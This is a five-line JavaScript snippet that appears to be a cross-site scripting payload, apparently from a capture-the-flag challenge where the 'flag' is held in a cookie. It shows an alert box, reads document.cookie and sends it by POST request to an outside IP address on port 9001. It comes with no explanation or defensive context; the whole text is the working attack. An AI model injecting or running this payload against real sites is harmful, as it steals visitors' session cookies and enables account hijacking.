alert(1);
var msg = "flag=" + document.cookie;
var server = new XMLHttpRequest();
server.open("POST", "http://85.76.7.216:9001", true);
server.send(msg);
